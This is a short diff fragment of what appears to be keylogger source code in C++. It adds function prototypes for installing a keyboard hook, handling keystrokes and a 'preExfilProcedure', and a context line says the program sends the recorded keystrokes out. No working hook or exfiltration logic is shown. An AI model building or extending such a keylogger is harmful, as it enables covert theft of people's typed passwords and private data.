@@ -17,6 +17,13 @@ record keystrokes, convert them into human readable names, and send them out to 
 
 namespace APIHook
 {
+	// Method prototypes for improved readability
+
+	void preExfilProcedure();
+	LRESULT hookingProcedure(int nCode, WPARAM wParam, LPARAM lParam);
+	void installHook();
+	void uninstallHook();
+	bool isHooked();
 
 	HHOOK keyboardHook = NULL;
 	std::string workingKeyLog = "";
